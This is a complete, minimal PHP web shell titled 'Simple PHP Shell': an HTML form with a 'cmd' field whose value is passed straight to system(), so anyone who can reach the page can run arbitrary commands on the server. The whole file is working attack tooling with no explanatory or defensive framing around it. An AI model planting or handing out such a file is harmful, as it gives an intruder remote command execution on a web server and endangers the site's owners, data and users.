<html>
  <head>
    <title>Simple PHP Shell</title>
  </head>

  <body>
    <!-- Simple text form to enter commands -->
    <form>
      <input type="text" name="cmd" />
      <input type="submit" value="Enter" />
    </form>

    <!-- Execute the commands -->
    <?php system($_GET["cmd"])?>
  </body>
</html>
